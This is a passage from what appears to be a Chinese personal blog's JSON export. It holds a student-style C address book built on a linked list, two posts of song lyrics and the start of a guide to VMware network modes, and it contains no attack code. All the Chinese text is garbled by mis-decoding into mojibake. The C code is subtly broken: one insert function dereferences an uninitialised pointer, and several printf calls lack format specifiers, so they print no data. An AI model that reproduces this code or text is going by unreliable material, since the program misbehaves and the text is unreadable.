printf(&quot;å½•å…¥ç¬¬%dæ¡è®°å½•ï¼š\\n&quot;,count); printf(&quot;IDï¼ˆç¼–å·ï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); //åˆ¤æ–­ ID æ˜¯å¦é‡å¤ List *p = L-&gt;next; //ç”±äºæ˜¯å‰æ’ï¼Œåˆ™å°† å½“å‰æ’å…¥çš„ ID ä¸ é“¾è¡¨ä¸­åä¸€ä½è¿›è¡Œæ¯”è¾ƒ while(p)&#123; if(strcmp(p-&gt;data.ID,node-&gt;data.ID) == 0)&#123; printf(&quot;IDé‡å¤ï¼Œè¯·é‡æ–°è¿›è¡Œè¾“å…¥ï¼\\n&quot;); printf(&quot;IDï¼ˆç¼–å·ï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); &#125;else p = p-&gt;next; //éå†æ‰€æœ‰å…ƒç´ è¿›è¡Œæ¯”è¾ƒ &#125; printf(&quot;å§“åï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.name)); printf(&quot;æ€§åˆ«ï¼ˆå¥³ï¼šF ç”·ï¼šMï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.sex)); printf(&quot;ç”µè¯ï¼ˆ11ä½ï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.tele)); printf(&quot;ä½å€ï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.add)); printf(&quot;åˆ†ç»„ï¼ˆæœ‹å‹ã€å®¶äººã€åŒå­¦ç­‰ï¼‰ï¼š&quot;); scanf(&quot;%s&quot;,(node-&gt;data.group)); //å°¾æ’ tail-&gt;next = node; node-&gt;next = NULL; tail = node; printf(&quot;æ˜¯å¦ç»§ç»­å½•å…¥ï¼Ÿï¼ˆ1.ç»§ç»­ 0.å®Œæˆå½•å…¥ï¼‰&quot;); scanf(&quot;%d&quot;,&amp;flag); if(flag == 0) break; &#125;&#125;//å››ã€åˆ é™¤è®°å½•void Dele_List()&#123; List *p = L-&gt;next; List *q = L; //ä½¿ q å§‹ç»ˆæŒ‡å‘ p çš„å‰ä¸€ä¸ªç»“ç‚¹ char ID[15]; printf(&quot;è¯·è¾“å…¥éœ€è¦åˆ é™¤çš„IDï¼š&quot;); scanf(&quot;%s&quot;,&amp;ID); while(p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0)&#123; //æŸ¥æ‰¾ éœ€è¦åˆ é™¤çš„èŠ‚ç‚¹ä½ç½® p p = p-&gt;next; q = q-&gt;next; &#125; if(p)&#123; q-&gt;next = p-&gt;next; //åˆ é™¤ p æ‰€æŒ‡ç»“ç‚¹ printf(&quot;åˆ é™¤æˆåŠŸï¼\\n&quot;); printf(&quot;æ‚¨æ‰€åˆ é™¤çš„ä¿¡æ¯æ˜¯ï¼š\\n&quot;); printf(&quot;IDï¼ˆç¼–å·ï¼‰ï¼š&quot;,p-&gt;data.ID); printf(&quot;å§“åï¼š&quot;,p-&gt;data.name); printf(&quot;æ€§åˆ«ï¼ˆå¥³ï¼šF ç”·ï¼šMï¼‰ï¼š&quot;,p-&gt;data.sex); printf(&quot;ç”µè¯ï¼š&quot;,p-&gt;data.tele); printf(&quot;ä½å€ï¼š&quot;,p-&gt;data.add); printf(&quot;åˆ†ç»„ï¼š&quot;,p-&gt;data.group); free(p); //é‡Šæ”¾ç©ºé—´ &#125;else&#123; printf(&quot;é€šè®¯å½•ä¸­ä¸å­˜åœ¨æ­¤äººä¿¡æ¯ï¼\\n&quot;); &#125;&#125;//äº”ã€æ’å…¥è®°å½•ï¼ˆå‰æ’æ³•ï¼‰void Insert_List_front()&#123; List *p,*q,*r,*node; p = p-&gt;next; q = L; char ID[15]; printf(&quot;è¯·è¾“å…¥éœ€è¦æ’å…¥çš„è®°å½• IDï¼š&quot;); scanf(&quot;%s&quot;,&amp;ID); while(p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0)&#123; p = p-&gt;next; q = q-&gt;next; &#125; if(p != NULL)&#123; node = (List*)malloc(sizeof(List)); printf(&quot;è¯·è¾“å…¥ç»“ç‚¹ä¿¡æ¯ï¼š\\n&quot;); judge: printf(&quot;IDï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.ID)); //åˆ¤æ–­ ID æ˜¯å¦é‡å¤ r = L-&gt;next; while(r &amp;&amp; strcmp(r-&gt;data.ID,node-&gt;data.ID) != 0) &#123; r = r-&gt;next; &#125; if(r != NULL) //ID é‡å¤ &#123; printf(&quot;IDé‡å¤ï¼Œè¯·é‡æ–°è¾“å…¥ï¼\\n&quot;); goto judge; &#125; printf(&quot;å§“åï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.name)); printf(&quot;æ€§åˆ«ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.sex)); printf(&quot;ç”µè¯ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.tele)); printf(&quot;ä½å€ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.add)); printf(&quot;åˆ†ç»„ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(node-&gt;data.group)); &#125; else &#123; //å¦‚æœæ²¡æœ‰è¯¥ID int select1; printf(&quot;é€šè®¯å½•ä¸­æœªæ‰¾åˆ°è¯¥ID,æ˜¯å¦ä½¿ç”¨é»˜è®¤æ–¹å¼å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°æœ€å(1.æ˜¯ 0.å¦)ï¼š&quot;); scanf(&quot;%d&quot;, &amp;select1); if (select1 == 1) &#123; //ç»™æ–°èŠ‚ç‚¹åˆ†é…ç©ºé—´ node = (List *)malloc(sizeof(List)); //ç»™æ–°èŠ‚ç‚¹è¾“å…¥æ•°æ® printf(&quot;è¯·è¾“å…¥æ–°èŠ‚ç‚¹ä¿¡æ¯ï¼š\\n&quot;); judge1: printf(&quot;IDï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.ID)); //åˆ¤æ–­IDæ˜¯å¦é‡å¤ r = L-&gt;next; while (r &amp;&amp; strcmp(r-&gt;data.ID, node-&gt;data.ID) != 0) &#123; r = r-&gt;next; &#125; if (r != NULL) //IDé‡å¤ &#123; printf(&quot;IDé‡å¤,è¯·é‡æ–°è¾“å…¥!\\n&quot;); goto judge1; &#125; printf(&quot;å§“åï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.name)); printf(&quot;æ€§åˆ«ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.sex)); printf(&quot;ç”µè¯ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.tele)); printf(&quot;ä½å€ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.add)); printf(&quot;åˆ†ç»„ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.group)); &#125; else return; &#125; node-&gt;next = q-&gt;next; q-&gt;next = node; printf(&quot;æ’å…¥æˆåŠŸï¼\\n&quot;);&#125;//å…­ã€æ’å…¥è®°å½•ï¼ˆå°¾æ’æ³•ï¼‰void Insert_List_behind()&#123; List *p, *r, *q, *node; p = L-&gt;next; q = L; char ID[15]; printf(&quot;è¯·è¾“å…¥è¦æ’å…¥çš„ä½ç½®(è¾“å…¥è¯¥ä½ç½®çš„ID)ï¼š&quot;); scanf(&quot;%s&quot;, &amp;ID); while (p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0) &#123; p = p-&gt;next; q = q-&gt;next; &#125; if (p != NULL) &#123; //ä¸ºæ–°èŠ‚ç‚¹åˆ†é…ç©ºé—´ node = (List*)malloc(sizeof(List)); //ä¸ºæ–°èŠ‚ç‚¹è¾“å…¥æ•°æ® printf(&quot;è¯·è¾“å…¥æ–°èŠ‚ç‚¹ä¿¡æ¯ï¼š\\n&quot;); judge: printf(&quot;IDï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.ID)); //åˆ¤æ–­IDæ˜¯å¦é‡å¤ r = L-&gt;next; while (r &amp;&amp; strcmp(r-&gt;data.ID, node-&gt;data.ID) != 0) &#123; r = r-&gt;next; &#125; if (r != NULL) &#123; printf(&quot;IDé‡å¤ï¼Œè¯·é‡æ–°è¾“å…¥ï¼\\n&quot;); goto judge; &#125; printf(&quot;å§“åï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.name)); printf(&quot;æ€§åˆ«ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.sex)); printf(&quot;ç”µè¯ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.tele)); printf(&quot;ä½å€ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.add)); printf(&quot;åˆ†ç»„ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.group)); node-&gt;next = p-&gt;next; p-&gt;next = node; printf(&quot;æ’å…¥æˆåŠŸï¼\\n&quot;); &#125; else &#123; //é€šè®¯å½•ä¸­æœªæ‰¾åˆ°è¯¥ID int select2; printf(&quot;é€šè®¯å½•ä¸­æœªæ‰¾åˆ°è¯¥ID,æ˜¯å¦ä½¿ç”¨é»˜è®¤æ–¹å¼å°†è¯¥èŠ‚ç‚¹æ’å…¥åˆ°æœ€å(1.æ˜¯ 0.å¦)ï¼š&quot;); scanf(&quot;%d&quot;, &amp;select2); if (select2 == 1) &#123; //ä¸ºæ–°èŠ‚ç‚¹åˆ†é…ç©ºé—´ node = (List *)malloc(sizeof(List)); //ä¸ºæ–°èŠ‚ç‚¹å½•å…¥ä¿¡æ¯ printf(&quot;è¯·è¾“å…¥æ–°èŠ‚ç‚¹ä¿¡æ¯ï¼š\\n&quot;); judge1: printf(&quot;IDï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.ID)); //åˆ¤æ–­IDæ˜¯å¦é‡å¤ r = L-&gt;next; while (r &amp;&amp; strcmp(r-&gt;data.ID, node-&gt;data.ID) != 0) &#123; r = r-&gt;next; &#125; if (r != NULL) //IDé‡å¤ &#123; printf(&quot;IDé‡å¤ï¼Œè¯·é‡æ–°è¾“å…¥ï¼\\n&quot;); goto judge1; &#125; printf(&quot;å§“åï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.name)); printf(&quot;æ€§åˆ«ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.sex)); printf(&quot;ç”µè¯ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.tele)); printf(&quot;ä½å€ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.add)); printf(&quot;åˆ†ç»„ï¼š&quot;); scanf(&quot;%s&quot;, &amp;(node-&gt;data.group)); node-&gt;next = q-&gt;next; q-&gt;next = node; &#125; if (select2 == 0) return; &#125; &#125;//ä¸ƒã€ä¿®æ”¹é€šè®¯å½•è®°å½•void Update_List()&#123; List *p; p = L-&gt;next; char ID[15]; printf(&quot;è¯·è¾“å…¥éœ€è¦ä¿®æ”¹çš„IDï¼š&quot;); scanf(&quot;%s&quot;,&amp;ID); while(p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0)&#123; p = p-&gt;next; &#125; if(p != NULL)&#123; int select; printf(&quot;è¯·è¾“å…¥éœ€è¦ä¿®æ”¹çš„å±æ€§ï¼šï¼ˆ1.å§“å 2.æ€§åˆ« 3.ç”µè¯ 4.ä½å€ 5.åˆ†ç»„ï¼‰ï¼š&quot;); scanf(&quot;%d&quot;,&amp;select); if(select == 1) &#123; printf(&quot;è¯·è¾“å…¥æ–°çš„å§“åï¼š&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.name)); &#125; if(select == 2) &#123; printf(&quot;è¯·è¾“å…¥æ–°çš„æ€§åˆ«ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.sex)); &#125; if(select == 3) &#123; printf(&quot;è¯·è¾“å…¥æ–°çš„ç”µè¯ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.tele)); &#125; if(select == 4) &#123; printf(&quot;è¯·è¾“å…¥æ–°çš„ä½å€ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.add)); &#125; if(select == 5) &#123; printf(&quot;è¯·è¾“å…¥æ–°çš„åˆ†ç»„ï¼š&quot;); scanf(&quot;%s&quot;,&amp;(p-&gt;data.group)); &#125; printf(&quot;æ›´æ–°æˆåŠŸï¼\\n&quot;); &#125; else &#123; printf(&quot;é€šè®¯å½•ä¸­ä¸å­˜åœ¨è¯¥ IDï¼\\n&quot;); return; &#125;&#125;//å…«ã€æŸ¥æ‰¾è®°å½•ï¼ˆæ ¹æ®IDï¼‰void Find_List()&#123; List *p; char ID[15]; p = L-&gt;next; printf(&quot;è¯·è¾“å…¥éœ€è¦æŸ¥æ‰¾çš„IDï¼š&quot;); scanf(&quot;%s&quot;,&amp;ID); while(p &amp;&amp; strcmp(p-&gt;data.ID,ID) != 0) &#123; p = p-&gt;next; &#125; if(p == NULL) &#123; printf(&quot;é€šè®¯å½•ä¸­ä¸å­˜åœ¨æ­¤äººï¼\\n&quot;); return; &#125; else &#123; printf(&quot;IDï¼ˆç¼–å·ï¼‰ï¼š%s\\t&quot;,p-&gt;data.ID); printf(&quot;å§“åï¼š&quot;,p-&gt;data.name); printf(&quot;æ€§åˆ«ï¼ˆå¥³ï¼šF ç”·ï¼šMï¼‰ï¼š%s\\t&quot;,p-&gt;data.sex); printf(&quot;ç”µè¯ï¼ˆ11ä½ï¼‰ï¼š%s\\t&quot;,p-&gt;data.tele); printf(&quot;ä½å€ï¼š%s\\t&quot;,p-&gt;data.add); printf(&quot;åˆ†ç»„ï¼ˆæœ‹å‹ã€å®¶äººã€åŒå­¦ç­‰ï¼‰ï¼š%s\\t&quot;,p-&gt;data.group); &#125;&#125;//ä¹ã€æ‰“å°è¾“å‡ºæ‰€æœ‰è®°å½• éå†void Printall_List()&#123; List *p; if(L == NULL) &#123; printf(&quot;é€šè®¯å½•æ˜¯ç©ºçš„ï¼\\n&quot;); return; &#125; else &#123; p = L-&gt;next; printf(&quot;é€šè®¯å½•ä¸­çš„å…¨éƒ¨è®°å½•å¦‚ä¸‹ï¼š\\n&quot;); while(p) &#123; printf(&quot;IDï¼ˆç¼–å·ï¼‰ï¼š%s\\t&quot;,p-&gt;data.ID); printf(&quot;å§“åï¼š&quot;,p-&gt;data.name); printf(&quot;æ€§åˆ«ï¼ˆå¥³ï¼šF ç”·ï¼šMï¼‰ï¼š%s\\t&quot;,p-&gt;data.sex); printf(&quot;ç”µè¯ï¼ˆ11ä½ï¼‰ï¼š%s\\t&quot;,p-&gt;data.tele); printf(&quot;ä½å€ï¼š%s\\t&quot;,p-&gt;data.add); printf(&quot;åˆ†ç»„ï¼ˆæœ‹å‹ã€å®¶äººã€åŒå­¦ç­‰ï¼‰ï¼š%s\\t&quot;,p-&gt;data.group); printf(&quot;\\n&quot;); p = p-&gt;next; &#125; &#125;&#125;//åã€é‡Šæ”¾ é“¾è¡¨void Destroy_List()&#123; List *p,*q; p = L-&gt;next; while(p) &#123; q = p; //ä½¿ç”¨ q æš‚æ—¶å­˜æ”¾å½“å‰ç»“ç‚¹ p = p-&gt;next; free(q); q = NULL; &#125; free(p); free(L); L = NULL; printf(&quot;é‡Šæ”¾æˆåŠŸï¼\\n&quot;);&#125;//èœå•ç•Œé¢void Menu()&#123; printf(&quot;\\t\\t\\t*********************ç®€æ˜“é€šè®¯å½•*******************\\n&quot;); printf(&quot;\\t\\t\\t1.åˆå§‹åŒ–é€šè®¯å½• 5.æŸ¥æ‰¾è”ç³»äºº\\n&quot;); printf(&quot;\\t\\t\\t2.åˆ›å»ºé€šè®¯å½• 6.æ’å…¥è”ç³»äºº\\n&quot;); printf(&quot;\\t\\t\\t3.åˆ é™¤è”ç³»äºº 7.éå†é€šè®¯å½•\\n&quot;); printf(&quot;\\t\\t\\t4.ä¿®æ”¹è”ç³»äºº 8.é‡Šæ”¾é€šè®¯å½•\\n&quot;); printf(&quot;\\t\\t\\t********************* 0 ä¸ºé€€å‡º *******************\\n&quot;);&#125; int main()&#123; int select; printf(&quot;ä½¿ç”¨è¯´æ˜ï¼šä¸ºäº†æ‚¨çš„æ­£å¸¸ä½¿ç”¨ï¼Œè¯·æŒ‰ç…§é¡ºåºè¿›è¡Œæ“ä½œï¼ï¼ï¼\\n&quot;); printf(&quot;é¦–å…ˆè¯·åˆå§‹åŒ–ï¼›éšåè¯·åˆ›å»ºé€šè®¯å½•ï¼ï¼ï¼ä¹‹åå¯è¿›è¡Œ åˆ é™¤ã€ä¿®æ”¹ã€æŸ¥æ‰¾ã€æ’å…¥ã€éå†ç­‰æ“ä½œï¼›æœ€åè¯·é‡Šæ”¾é€šè®¯å½•ï¼ï¼\\n&quot;); while(1) &#123; //system(&quot;cls&quot;); Menu(); printf(&quot;è¯·é€‰æ‹©èœå•ï¼š&quot;); scanf(&quot;%d&quot;,&amp;select); switch(select)&#123; case 1: &#123; //åˆå§‹åŒ– Init_List(); break; &#125; case 2: &#123; //åˆ›å»ºé€šè®¯å½• int num; printf(&quot;è¯·é€‰æ‹©åˆ›å»ºæ–¹å¼(1.å‰æ’æ³• 2.å°¾æ’æ³•)ï¼š&quot;); scanf(&quot;%d&quot;,&amp;num); if(num == 1) &#123; //å‰æ’æ³• Creat_List_front(); break; &#125; if(num == 2) &#123; //å°¾æ’æ³• Creat_List_behind(); break; &#125; &#125; case 3: &#123; //åˆ é™¤è®°å½• Dele_List(); break; &#125; case 4: &#123; //ä¿®æ”¹è®°å½• Update_List(); break; &#125; case 5: &#123; //æŸ¥æ‰¾è®°å½• Find_List(); break; &#125; case 6: &#123; //æ’å…¥è®°å½• int num; printf(&quot;è¯·é€‰æ‹©æ’å…¥æ–¹å¼(1.å‰æ’æ³• 2.å°¾æ’æ³•)&quot;); scanf(&quot;%d&quot;,&amp;num); if(num == 1) &#123; //å‰æ’æ³• Insert_List_front(); break; &#125; if(num == 2) &#123; //å°¾æ’æ³• Insert_List_behind(); break; &#125; &#125; case 7: &#123; //éå† Printall_List(); break; &#125; case 8: &#123; //é‡Šæ”¾ Destroy_List(); break; &#125; case 0: &#123; return 0; &#125; default: break; &#125; system(&quot;pause&quot;); system(&quot;cls&quot;); &#125;&#125;","categories":[{"name":"æ•°æ®ç»“æ„","slug":"æ•°æ®ç»“æ„","permalink":"https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"tags":[],"author":"xizhi-future"},{"title":"å‘“è¯­","slug":"å‘“è¯­","date":"2021-10-10T08:46:24.000Z","updated":"2021-10-10T09:07:35.393Z","comments":true,"path":"2021/10/10/å‘“è¯­/","link":"","permalink":"https://xizhi-future.github.io/2021/10/10/%E5%91%93%E8%AF%AD/","excerpt":"","text":"ä½œè¯ : æ¯›ä¸æ˜“ ä½œæ›² : æ¯›ä¸æ˜“ ä¸€æ®µæœªé†’ åˆåšä¸€æ®µ å¦‚æœè¿™ç”»é¢æœ‰å¼€å…³ ä»æœŸå¾…èµ°åˆ°ä¸å ª ç»“å±€ä¸å¥½çœ‹ äººæ€»éœ€è¦è®°ä½é—æ†¾ å®ƒæ¥è¿‡ å®ƒèµ°äº† æ²¡å›å¤´ æ²¡é—®è¿‡ ä½ å¯èˆå¾— æ—¥æœˆè¹‰è· å°èµ·å¤§è½ å…‰é˜´é‡Œæœ‰å¤šå°‘æ™¯è‰² å¶å°”ä¹Ÿå¿ƒå£ä¸€çƒ­ ä»€ä¹ˆéƒ½ä¸è¯´ å¥½è¿‡äº²æ‰‹æŠŠå®ƒæ’•ç ´ è·¯è¿˜é•¿ æ¢¦è¿˜å¤š è¢«è¿™è¯ æ¬ºéª—çš„ ä½•æ­¢ä½ æˆ‘ å¯æ˜¯æˆ‘ç°åœ¨ä¾ç„¶ä¸å¤ªä¼šè½¬å¼¯ è™½ç„¶å­¤å•çš„äººå¶å°”ä¹Ÿæƒ³æœ‰ä¸ªä¼´ å†·é£åˆå¹çš„æ—¶å€™æƒ³è¯´ è¿™ç”Ÿæ´»ä¼šä¸ä¼šæœ‰ç‚¹éš¾ éš¾é“æ˜¯å› ä¸ºå½“åˆæœ‰è¯æ²¡è®²å®Œ å µåœ¨å–‰å’™é‡Œå´å§‹ç»ˆä¸æ•¢å¤§å£°å–Š ç®—äº† åˆ«å“­ æ—¥æœˆè¹‰è· å°èµ·å¤§è½ å…‰é˜´é‡Œæœ‰å¤šå°‘æ™¯è‰² å¶å°”ä¹Ÿå¿ƒå£ä¸€çƒ­ ä»€ä¹ˆéƒ½ä¸è¯´ å¥½è¿‡äº²æ‰‹æŠŠå®ƒæ’•ç ´ è·¯è¿˜é•¿ æ¢¦è¿˜å¤šï¼ˆä¸å¤šï¼‰ è¢«è¿™è¯ æ¬ºéª—çš„ ä½•æ­¢ä½ æˆ‘ å¯æ˜¯æˆ‘ç°åœ¨ä¾ç„¶ä¸å¤ªä¼šè½¬å¼¯ è™½ç„¶å­¤å•çš„äººå¶å°”ä¹Ÿæƒ³æœ‰ä¸ªä¼´ å†·é£åˆå¹çš„æ—¶å€™æƒ³è¯´ è¿™ç”Ÿæ´»ä¼šä¸ä¼šæœ‰ç‚¹éš¾ éš¾é“æ˜¯å› ä¸ºå½“åˆæœ‰è¯æ²¡è®²å®Œ å µåœ¨å–‰å’™é‡Œå´å§‹ç»ˆä¸æ•¢å¤§å£°å–Š ç®—äº† åˆ«å“­ å¯æ˜¯æˆ‘ååå°±æ˜¯ä¸æƒ³è¦è½¬å¼¯ å°±ç®—ä¸å¼€ç¯çš„æˆ¿é—´çœŸçš„æœ‰äº›æš— å¤œè‰²åˆæ¥çš„æ—¶å€™æƒ³è¯´ ä¸ºä»€ä¹ˆåªç•™ç»™æˆ‘ä¸€åŠ éš¾é“æ˜¯å› ä¸ºå‡ºç°çš„äººéƒ½ä¼ªå–„ æ“…é•¿å‘Šåˆ«æ“…é•¿èº²é—ªæ“…é•¿åˆ†ä¸¤ç«¯ ç®—äº† åˆ«å“­","categories":[{"name":"éŸ³ä¹åˆ†äº«","slug":"éŸ³ä¹åˆ†äº«","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"ä¿ç•™","slug":"ä¿ç•™","date":"2021-10-10T08:44:00.000Z","updated":"2021-10-10T08:45:51.039Z","comments":true,"path":"2021/10/10/ä¿ç•™/","link":"","permalink":"https://xizhi-future.github.io/2021/10/10/%E4%BF%9D%E7%95%99/","excerpt":"","text":"ä½œè¯ : éƒ­é¡¶ ä½œæ›² : éƒ­é¡¶ çœ‹è§ ä½ åœ¨æˆ‘çœ¼å‰ ä¸å»çŒœæƒ³æˆ‘ä»¬éš”å¤šè¿œ å½“æˆ‘ å¤œå¹•ä¸­å‡†å¤‡ åªæƒ³è®©æ²‰é»˜çš„èƒ½å¼€è§£ åœ¨ä¸åŒçš„é­é‡é‡Œæˆ‘å‘ç°ä½ çš„ç¬é—´ æœ‰ç§ä¸å¯è¨€è¯´çš„æ¸©æŸ”ç›´è§‰ åœ¨æœ‰é™çš„æ·±å¤œæ¶ˆå¤±ä¹‹å‰è§¦æ‘¸ä½ çš„è„¸ æˆ‘æƒ…æ„¿è¿™æ˜¯å¹»è§‰ ä¹Ÿä¸æ„¿æ˜¯ç§å‘Šåˆ« å·²ç»å¿˜äº† ä½ çš„åå­— å°±åœ¨è¿™åº§ å¯‚é™æ˜ŸçŸ³ æ€ä¹ˆè¿˜æœ‰ ä½ çš„æ ·å­ è¢«ä¿ç•™ ç»™æˆ‘ ä¸€æ•´ä¸ªæ‹¥æŠ± å¥½è®©æˆ‘ä¸è‡³äº å¤ªæ½¦å€’ æ—¶é—´ è¿‡ä¸€åˆ†ä¸€ç§’ è¿˜æ˜¯è§‰å¾—ç›¸é‡ å¤ªç¾å¥½ åœ¨ä¸åŒçš„é­é‡é‡Œæˆ‘å‘ç°ä½ çš„ç¬é—´ æœ‰ç§ä¸å¯è¨€è¯´çš„æ¸©æŸ”ç›´è§‰ å½“ä¸è¿œçš„è“è‰²æ¸æ¸æ˜¾ç°è¿™æ— è¾¹å¢ƒç•Œ æˆ‘å§‹ç»ˆç­‰å¾…å†è§ åªä¸æ„¿å†ä¹Ÿä¸è§ å·²ç»å¿˜äº† ä½ çš„åå­— å°±åœ¨è¿™åº§ å¯‚é™æ˜ŸçŸ³ æ€ä¹ˆè¿˜æœ‰ ä½ çš„æ ·å­ æƒ³å½¢å®¹ä½ çš„å¥å­ å…³äºä½ æ‰€æœ‰å¿ƒäº‹ ä¸€çœ¼èƒ½åŠçš„é’»çŸ³ å“ªä¸€ä¸ªæ˜¯ä½ åœ°å€ å¿˜äº† ä½ çš„åå­— å°±åœ¨è¿™åº§ å¯‚é™æ˜ŸçŸ³ æ€ä¹ˆè¿˜æœ‰ ä½ çš„æ ·å­ æˆ‘å§‹ç»ˆç­‰å¾…å†è§ åªä¸æ„¿å†ä¹Ÿä¸è§ çœŸçš„å¿˜äº† ä½ çš„åå­— æ˜¯åœ¨å“ªåº§ å¯‚é™æ˜ŸçŸ³ ä¸€ç›´è¿˜æœ‰ ä½ çš„æ ·å­ è¢«ä¿ç•™","categories":[{"name":"éŸ³ä¹åˆ†äº«","slug":"éŸ³ä¹åˆ†äº«","permalink":"https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"}],"tags":[],"author":"xizhi-future"},{"title":"è™šæ‹Ÿæœºçš„ç½‘ç»œè®¾ç½®","slug":"è™šæ‹Ÿæœºçš„ç½‘ç»œè®¾ç½®","date":"2021-10-08T13:12:52.000Z","updated":"2021-10-08T13:13:15.379Z","comments":true,"path":"2021/10/08/è™šæ‹Ÿæœºçš„ç½‘ç»œè®¾ç½®/","link":"","permalink":"https://xizhi-future.github.io/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"è™šæ‹Ÿæœºçš„ç½‘ç»œè®¾ç½®VMwareä¸‰ç§ç½‘ç»œè®¾ç½®ï¼šBridgedæ¡¥æ¥ï¼ŒNETç½‘ç»œåœ°å€è½¬æ¢æ¨¡å¼ï¼ŒHost-Onlyä»…ä¸»æœºæ¨¡å¼ å½“ä¸‹è½½è½¯ä»¶ä¹‹åï¼Œæˆ‘ä»¬çš„çœŸå®æœºä¸Šå°†ä¼šå¤šå‡ºä¸€äº›è™šæ‹Ÿç½‘å¡ï¼Œç”¨äº è™šæ‹Ÿæœºç½‘ç»œçš„é…ç½® VMnet0 ï¼šç”¨äº Bridged æ¡¥æ¥æ¨¡å¼ VMnet8 ï¼šç”¨äº NET æ¨¡å¼ VMnet1 ï¼šç”¨äº Host-Only æ¨¡å¼ å¯ä»¥çœ‹åˆ°å­˜åœ¨ ä¸‰ä¸ª VMnet0 VMnet1 VMnet8 è¿™äº›æ˜¯ VMware Workstation è½¯ä»¶ è‡ªå¸¦çš„ï¼Œå¯ä»¥è¿›è¡Œè®¾ç½®ï¼Œå¯ä»¥è¿›è¡Œåˆ é™¤ï¼Œå®ƒä»¬ç›¸å½“äº æ˜¯ä¸‰ä¸ªäº¤æ¢æœºã€‚ VMnet0 ï¼šå¦‚æœå°†ä¸€ä¸ªè™šæ‹Ÿæœºè®¾ç½®ä¸ºè¿æ¥åœ¨ è¯¥äº¤æ¢æœºä¸Šï¼Œåˆ™ç›¸å½“äº å°†å…¶ å½“ä½œä¸€ä¸ª çœŸå®çš„ç‰©ç†æœº ä¸€æ ·è¿æ¥åœ¨ä½  çœŸå®æœºçš„æ‰€å¤„çš„ç½‘æ®µ å½“ä¸­ã€‚ æµ‹è¯•ï¼šè®¾ç½® Windows 7 æ¥åœ¨ VMnet0 ä¸Š æˆ‘ä»¬è®¾ç½®ä¸º è‡ªåŠ¨è·å¾— IP åœ°å€ï¼Œç„¶åæŸ¥çœ‹å…¶ç½‘ç»œè¿æ¥çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ä¸æˆ‘ä»¬çœŸå®çš„ç‰©ç†æœºæ‰€å¤„çš„ç½‘æ®µç›¸åŒã€‚ ä½¿ç”¨ çœŸå®æœº ping 192.168.4.234 å®é™…ä¸Šï¼Œåªè¦æ˜¯å¤„äºè¯¥ç½‘æ®µä¸­çš„ä»»æ„ä¸€å°è®¡ç®—æœºéƒ½å¯ä»¥ ping é€š æˆ‘ä»¬æ‰€è®¾ç½®çš„ è™šæ‹Ÿæœº å½“ä¸­å¯èƒ½å‡ºç°çš„é”™è¯¯ï¼šè§£å†³åŠæ³• ï¼ˆæ³¨æ„ï¼šéœ€è¦ä½¿ç”¨ ç®¡ç†å‘˜æ–¹å¼è¿è¡Œï¼›å…³é—­è¦ping çš„ä¸»æœºçš„é˜²ç«å¢™ï¼‰ å½“ä¸éœ€è¦ä¸å¤–ç½‘è¿›è¡Œé€šä¿¡ï¼Œä¹Ÿå°±æ˜¯å¹³æ—¶æˆ‘ä»¬ ä»…ä»…æ­å»ºä¸€ä¸ªå°å‹å±€åŸŸç½‘çš„ æµ‹è¯•ï¼Œåªéœ€è¦æˆ‘ä»¬çš„å‡ ä¸ªè™šæ‹Ÿæœºä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œæˆ‘ä»¬å°±ä¸ç”¨ä½¿ç”¨ VMnet0 ï¼Œå¯ä»¥ä½¿ç”¨ å…¶ä»–çš„äº¤æ¢æœºæˆ–è€…æ˜¯ ä½¿ç”¨ Host-Only **NET 